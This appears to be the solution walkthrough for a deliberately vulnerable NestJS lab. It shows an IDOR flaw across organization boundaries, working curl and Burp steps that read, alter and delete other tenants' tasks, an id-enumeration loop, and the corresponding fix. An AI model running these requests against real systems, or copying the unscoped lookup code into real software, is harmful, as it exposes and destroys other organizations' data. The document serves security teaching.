# tasknest: Solution / Walkthrough

![CWE-639](https://img.shields.io/badge/CWE--639-IDOR-red?style=flat-square)
![Node](https://img.shields.io/badge/Node-NestJS-E0234E?style=flat-square&logo=nestjs&logoColor=white)
![Docker](https://img.shields.io/badge/Lab-Docker-2496ED?style=flat-square&logo=docker&logoColor=white)

**tasknest is an intentionally vulnerable application built for security education.** It contains a deliberate [IDOR / broken access control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
(CWE-639) flaw so you can practice finding and exploiting it in a safe and controlled environment.

<br>

> [!WARNING]
> This page gives away the exploit and the flag. If you want to solve it yourself, start with the non-spoiler **[Learning Guide](GUIDE.md)** and come back here to check your work.

<br>

## 📚 What you'll get from this page

The [Learning Guide](GUIDE.md) covers *what* broken access control is and *how*
to approach the lab. This page is the spoiler half: the confirmed exploit, the
flag, and — most importantly — the **why** behind the bug and its fix. By the
end you should be able to:

- Read a NestJS controller and point to the exact missing tenant check.
- Reproduce the exploit by hand, crossing from one organization to another.
- Explain **why** a correctly scoped list endpoint did not protect the rest.

> **One-line recap** (full version in the [GUIDE](GUIDE.md)): an IDOR happens
> when an app acts on an object by a client-supplied reference without checking
> the object belongs to the caller. In a multi-tenant app "belongs to the caller"
> means *belongs to the caller's organization* — and that check has to be in
> **every** query that touches tenant data.

<br>

## 🐛 The vulnerability

Every task has an `org_id`, and the session remembers the caller's
organization. The list endpoint uses it; the three by-id endpoints do not.
`src/tasks/tasks.controller.ts`:

```ts
@Controller('api')
@UseGuards(AuthGuard)                       // session required — authentication only
export class TasksController {
  // SAFE: scoped by the org stored in the SESSION.
  @Get('tasks')
  async list(@Req() req: Request & { session: SessionData }) {
    return { tasks: await this.tasks.listForOrg(req.session.orgId!) };
  }

  // ⚠️ READ IDOR
  @Get('tasks/:id')
  async getOne(@Param('id', ParseIntPipe) id: number) {
    const task = await this.tasks.findById(id);          // by id ONLY — no org filter
    if (!task) throw new NotFoundException('task not found');
    return { task };
  }

  // ⚠️ WRITE IDOR (update)
  @Patch('tasks/:id')
  async update(@Param('id', ParseIntPipe) id: number, @Body() body: UpdateTaskDto) { /* update(id) */ }

  // ⚠️ WRITE IDOR (delete)
  @Delete('tasks/:id')
  async remove(@Param('id', ParseIntPipe) id: number) { /* remove(id) */ }
}
```

and the service (`src/tasks/tasks.service.ts`):

```ts
// SAFE
async listForOrg(orgId: number) {
  return db.select().from(tasks).where(eq(tasks.orgId, orgId)) /* … */;
}

// ⚠️ looked up by id ONLY — no `org_id` condition
async findById(id: number) {
  const [row] = await db.select().from(tasks).where(eq(tasks.id, id)).limit(1);
  return row ? toView(row) : undefined;
}
```

Walk through it the way the server does:

1. `AuthGuard` ensures there **is** a session (with an org) — authentication. It
   says nothing about *which organization's* tasks you may touch.
2. `ParseIntPipe` validates that the id is a number, so this is not about
   malformed input — any valid integer sails through.
3. The query filters by `tasks.id = id` and **nothing else**. There is no
   `AND org_id = <session org>`.
4. The handler reads / updates / deletes whatever row matched. Any logged-in user
   can act on any tenant's task.

And here is the enabler: `tasks.id` is **one global sequential counter**, not one
per organization. `GET /api/tasks` (correctly) only returns your tenant's rows,
but the ids on them — `1, 2, 3` — immediately tell you the counter continues, and
the rows in between and after belong to someone else.

> **Why does it look safe?** The board only ever shows your own tasks, so every
> number the UI sends is "yours". The team assumed the client would only ask for
> numbers it was given. Nothing enforces that.

<br>

## 💥 Exploitation

You log in as **alice** (`password123`), who works at *Northwind Traders*.

With `curl`, using a cookie jar to hold the session:

```bash
# 1) Log in as alice and save the session cookie.
curl -s -c jar.txt -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"password123"}' \
  http://localhost:3000/api/login
# {"ok":true,"user":{"id":1,...},"org":{"id":1,"name":"Northwind Traders","slug":"northwind"}}

# 2) See your own board — note the task numbers (1, 2, 3) and orgId 1.
curl -s -b jar.txt http://localhost:3000/api/tasks
```

The numbers `1–3` are yours, so the counter obviously goes on. Read the next ones
with the same request you used as a baseline:

```bash
# 3) READ IDOR — a task that is NOT on your board.
curl -s -b jar.txt http://localhost:3000/api/tasks/4
# {"task":{"id":4,"orgId":2,"title":"Plan the board meeting",...}}   ← orgId 2: Globex

# 4) Keep walking — id 5 is Globex's confidential task.
curl -s -b jar.txt http://localhost:3000/api/tasks/5
```

Expected output (step 4), with the flag in the description:

```json
{
  "task": {
    "id": 5,
    "orgId": 2,
    "createdBy": 2,
    "title": "CONFIDENTIAL: acquisition shortlist",
    "description": "Do not share outside the leadership team. Access code: FLAG{TASKNEST_CROSSED_TENANTS}",
    "status": "todo",
    "updatedAt": "2026-11-17T10:49:23.170Z"
  }
}
```

The write endpoints cross the boundary too — you can change or destroy another
organization's data:

```bash
# 5) WRITE IDOR (update) — move Globex's task to "done" and rewrite it.
curl -s -b jar.txt -X PATCH -H 'Content-Type: application/json' \
  -d '{"status":"done","title":"pwned by alice"}' \
  http://localhost:3000/api/tasks/6

# 6) WRITE IDOR (delete) — delete a task of a third organization (Initech).
curl -s -b jar.txt -X DELETE http://localhost:3000/api/tasks/8
```

> **Where does the flag come from?** It is **not** in the repo on purpose — it is
> baked into the Docker image at build time (`ARG FLAG`) and the seed writes it
> into Globex's confidential task (`orgId: 2`, id 5). You have to actually break
> access control against the running app to read it; you can't grep the source.

<br>

## 🚀 Going further

Seeded accounts: `alice` / `password123` and `dave` / `letmein-northwind` (Northwind,
org 1), `bob` / `correct-horse-battery-staple` (Globex, org 2), `carol` /
`hunter2hunter2` (Initech, org 3).

The endpoints act on *any* number, so the real exposure is every task of every
tenant — just walk the counter:

```bash
# Read tasks 1..50 and print which organization each belongs to.
for i in $(seq 1 50); do
  curl -s -b jar.txt "http://localhost:3000/api/tasks/$i" \
    | python3 -c 'import sys,json
try:
  t=json.load(sys.stdin)["task"]; print(t["id"], "org", t["orgId"], t["title"])
except Exception: pass'
done
```

A shared sequential counter is a gift to an attacker, but it is **not the bug**.
Swap the ids for UUIDs and the missing `org_id` condition is still there — you
would just need to learn a victim UUID (that was keyvault, Level 3).

<br>

## 🛠️ Doing it in Burp Suite

Prefer a proxy-driven workflow? This mirrors a real engagement:

1. Proxy your browser through Burp and sign in as `alice` at
   <http://localhost:3000>. Open one of your cards and find
   `GET /api/tasks/<n>` in **Proxy > HTTP history**. Send it to **Repeater** as
   the baseline.
2. In the response, note `"orgId": 1` — that is the tenant. Change the number in
   the path to one that is not on your board and send. A different `orgId` in the
   body proves the cross-tenant read.
3. Send `GET /api/tasks/§n§` to **Intruder** with a numbers payload `1–50` and
   sort by the `orgId` / response length to dump every tenant at once. Grep the
   responses for `FLAG{`.
4. Change the method to `PATCH` (with a JSON body) and `DELETE` on a foreign id
   to confirm the write IDORs.

> Testing tenant isolation well means having **identities from two different
> organizations**. Log in as `bob` / `correct-horse-battery-staple` (Globex) in a second browser container and
> confirm the same request returns *his* data to him and to alice — the contrast
> is the proof.

<br>

## 🛡️ The fix

Scope every query by the tenant taken from the **session**, never from the
request, so the condition can't be forgotten:

```ts
// service: look up by id AND organization in one query.
async findInOrg(id: number, orgId: number) {
  const [row] = await db
    .select()
    .from(tasks)
    .where(and(eq(tasks.id, id), eq(tasks.orgId, orgId)))
    .limit(1);
  return row ? toView(row) : undefined;
}

// controller: pass the session org, and 404 for anything outside it.
@Get('tasks/:id')
async getOne(
  @Param('id', ParseIntPipe) id: number,
  @Req() req: Request & { session: SessionData },
) {
  const task = await this.tasks.findInOrg(id, req.session.orgId!);
  if (!task) throw new NotFoundException('task not found');   // 404, don't leak existence
  return { task };
}
```

Apply the same condition to `UPDATE … WHERE id = :id AND org_id = :org` and
`DELETE … WHERE id = :id AND org_id = :org` so a foreign id touches zero rows.

For defence in depth, make the boundary structural rather than a per-query
habit: a repository/service that is *constructed with* the tenant, or Postgres
**row-level security** (`CREATE POLICY … USING (org_id = current_setting('app.org_id')::int)`),
so that forgetting the filter returns nothing instead of everything.

Why this works: being logged in is necessary but not sufficient; every object
access re-checks the tenant, the query can't return (or write) another
organization's row, and `404` (not `403`) means an attacker can't even confirm a
task exists.

### ⚠️ Tempting fixes that *don't* work

- **"The list page is already filtered by organization."** That protects the
  list. The by-id endpoints are separate code paths, and an attacker never needs
  the UI — they send the request directly.
- **Hiding the numbers / switching to UUIDs.** Raises the cost of *finding* a
  foreign id, not of *using* it. Authorization is the check, not the id format
  (that was Levels 1–5).
- **Per-organization numbering (`#1` in each tenant).** Still a client-supplied
  key; without the `org_id` condition the lookup is just ambiguous, not safe.
- **Taking `orgId` from the request** (header, query, body) and filtering by it.
  Then the attacker simply sends the victim's `orgId`. The tenant must come from
  the authenticated session.
- **Checking only that the user is logged in.** That's what the broken code
  already does. Authentication ≠ authorization.

<br>

## 🎓 Key takeaways

If you remember five things from this lab, make it these:

1. **In multi-tenant apps the tenant boundary is the authorization rule.** Every
   query over tenant data must be constrained to the caller's organization.
2. **A correct list endpoint proves nothing about the rest.** Audit every route
   that takes an id: read, update *and* delete.
3. **Take the tenant from the session, never from the request.**
4. **Scope at the source** (`WHERE id = :id AND org_id = :org`, or row-level
   security) so "forgot the check" is structurally impossible.
5. **Test with identities from two different organizations** — that is the only
   reliable way to see a tenant leak.

That's Level 6 — IDOR across a tenant boundary. Previously,
**[couponly (Level 5)](https://github.com/iv0ks/couponly)** hid the id behind
**hashids**. Next in the series, **[cartora (Level 7)](https://github.com/iv0ks/cartora)**
moves the identity out of the URL entirely — the server trusts a
**client-controlled** user id. Head back to the **[Learning Guide](GUIDE.md)** for
the method, or the **[README](README.md)** for the lab setup.

<br>

> **Legal / ethics.** This is an educational, deliberately vulnerable lab. Run it
> only locally, on owned, isolated infrastructure, and never use these techniques
> against systems without explicit written authorization.
